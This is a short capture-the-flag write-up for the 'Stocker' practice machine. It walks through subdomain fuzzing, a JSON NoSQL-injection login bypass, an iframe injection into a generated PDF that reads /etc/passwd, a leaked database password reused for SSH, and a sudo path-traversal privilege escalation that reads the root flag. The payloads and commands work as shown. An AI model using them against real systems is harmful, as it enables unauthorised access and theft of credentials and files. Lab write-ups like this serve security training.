# Stocker

## IP = 10.10.11.196

## Nmap


## Wfuzz
```
wfuzz -w list.txt -H "Host: FUZZ.stocker.htb" --hc 403,400,301 -t 150 10.10.11.196
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.196/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000019:   302        0 L      4 W        28 Ch       "dev"                                                                                                                                                                     

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

### Maybe user in placeholder:
`<input type="text" class="form-control" id="username" name="username" placeholder="jsmith" />`

### NoSQL injection, but you have to change the payload to json
Try all the payloads in PayloadAllTheThing:
```json
{"username": {"$ne":null }, "password": {"$ne": null }}
```

### HTML Injection in the "Title" field of the PDF. Inject an iframe:
https://stackoverflow.com/questions/42393063/load-local-html-on-iframe
```json

{
    "basket":[
        {
            "_id": "638f116eeb060210cbd83a8d",
            "title": "<iframe id=\"serviceFrameSend\" src=\"../../../../../../../../etc/passwd\" width=\"1000\" height=\"1000\" frameborder=\"0\">",
            "description":"It's a red cup.",
            "image":"red-cup.jpg",
            "price":32,
            "currentStock":4,
            "__v":0,
            "amount":1
        }
    ]
}
```
Result:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/fals
```

### Look into /var/www/dev/index.js
```
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

### SSH: angoose:IHeardPassphrasesArePrettySecure


### Privilege escalation really simple
```
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

Create a file that read `/root/root.txt`:
```
fs.readFile('/root/root.txt', "utf8", (err, data) => {
    console.log("Flag: " + data);
});
```

### Just run: `sudo /usr/bin/node /usr/local/scripts/../../../dev/shm/file.js`